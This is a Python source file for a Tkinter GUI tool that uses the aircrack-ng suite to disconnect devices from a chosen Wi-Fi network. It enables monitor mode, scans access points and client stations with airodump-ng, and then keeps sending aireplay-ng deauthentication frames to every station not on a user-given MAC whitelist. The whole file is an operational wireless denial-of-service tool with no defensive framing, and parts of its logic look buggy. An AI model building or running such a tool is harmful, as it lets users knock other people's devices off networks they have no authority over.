from tkinter import *
import threading
from threading import Event
from tkhtmlview import HTMLLabel
import time
import os
import subprocess
import pandas as pd



def read_file(fn=f"out-01.csv"):
    file = open(fn,"r")
    f = file.read().split("\n\n")
#find all Access Points
    routers = f[0]
    routers = routers.split("\n")
    router = list()
    channel = list()
    essid = list()
    pwr = list()
    for r in range(1,len(routers)):
        routers[r] = routers[r].split(",")
        router.append(routers[r][0].strip())
        channel.append(str(routers[r][3]).strip())
        essid.append(routers[r][13])
        pwr.append(str(routers[r][8]).strip())
    APs = {
        "router":router[1:],
        "channel":channel[1:],
        "essid":essid[1:],
        "pwr": pwr[1:]
    }
#Get station macs
    stations = f[1]
    stations = stations.split("\n")
    station_mac = list()
    router = list()
    for x in range(1,len(stations)):
        stations[x] = stations[x].split(",")
        station_mac.append(stations[x][0].strip())
        router.append(stations[x][5].strip())
    Stations = {
        "station": station_mac,
        "router": router
    }
    file.close()
    return Stations, APs


lock = threading.Lock()
rnm = ""
event = Event()
wifi = subprocess.Popen("""iw dev | awk '$1=="Interface"{print $2}'""", shell=True, stdout=subprocess.PIPE).stdout
wifi = wifi.read().decode().split('\n')
wifi = wifi[0].strip()

def killer():
    global stations, APs, rmacs, wifi
    if "mon" not in wifi:
        temp = subprocess.Popen(f"sudo airmon-ng start {wifi}", shell=True, stdout=subprocess.PIPE).stdout
        time.sleep(5)
    else:
        wifi = wifi.replace('mon','')

    os.system(f"sudo timeout 5 airodump-ng -w remove --write-interval 1 -o csv {wifi}mon")
    time.sleep(5.1)

    stations, APs = read_file(f"remove-01.csv") #read file
    rmacs = []


def setrmac():
    global rmac
    global rmacs
    global rnm
    global status
    try:
        for i in range(len(APs['essid'])):
            if str(APs['essid'][i].strip()) == rnm:
                status  = status,f"Found {rnm}\n"
                rmacs.append((APs['router'][i].strip(), int(APs['pwr'][i].strip()), APs['channel'][i].strip()))
        rmacs.sort(key = lambda x: x[1])
        rmac = rmacs[-1]

        os.system(f"sudo iwconfig {wifi}mon channel {rmac[2]}")
        sts.configure(text=status)
    except IndexError:
        sts.configure(text="NO DEVICES FOUND")
        time.sleep(5)
        stopper()



def ck():
    global rnm
    rnm = addr.get()
    sts.configure(text=str(f"{status}\n Scanning.....(might take upto 40 secs)"))
    killer()
    global x
    t2.start()
    while not event.is_set():
        macs = addr.get().split(";")
        if name.get() != rnm:
            sts.configure(text=str(f"Changed to {rnm}"))
            rnm = name.get()
            setrmac()
        sts.configure(text=f"{rnm} Deauthenticating")
        for y in stations['station']:
            if event.is_set():
                break
            if y.strip() in macs:
                pass
            else:
                os.system(f"sudo aireplay-ng --deauth 1 -a {rmac[0]} -c {y.strip()} {wifi}mon")
                
def display_csv():
    try:
        file = pd.DataFrame(stations)    
        cfile.configure(text=str(file.to_string()))
    except: cfile.configure(text="Some error occured")

t1 = threading.Thread(target=ck)
t2 = threading.Thread(target=display_csv)

def stopper():
    global x
    
    event.set()
    os.system("sudo rm -r remove-01.csv")
    t1.join()
    os.system(f"sudo airmon-ng stop {wifi}mon")
    exit()


root = Tk()
root.geometry("800x540")
root.configure(bg="#333333")
addr = StringVar()
nam = StringVar()
def start():    
    global x
    
    t1.start()

mac_label = Label(root, text="Mac addresses:", foreground="#FFFFFF", background="#333333").place(x=10, y=20)
addresses = Entry(root, textvariable=addr, width=50, background="#DDDDDD")
addresses.place(x=120, y=22)

routername = Label(root, text="AP Name:", foreground="#FFFFFF", background="#333333").place(x=10, y=70)
name = Entry(root, textvariable=nam, width=50, background="#DDDDDD")
name.place(x=120, y=72)

submit = Button(root, text="Start", command=start).place(x= 600, y=20)
stop_ = Button(root, text="Stop", command=stopper).place(x=700, y=20)
status = ""
ap_info = f"<h3 style='color: lavender'>Status</h3>\n{status}"
info = HTMLLabel(root, html=ap_info, background="#333333", foreground="#FFFFFF")
info.place(x=10, y=150)
sts = Label(root, text="")
sts.place(x=15, y=200)
cfile = Label(root, text="", bg="#333333", fg="#FFFFFF")
cfile.place(x=15, y= 280)
root.mainloop()
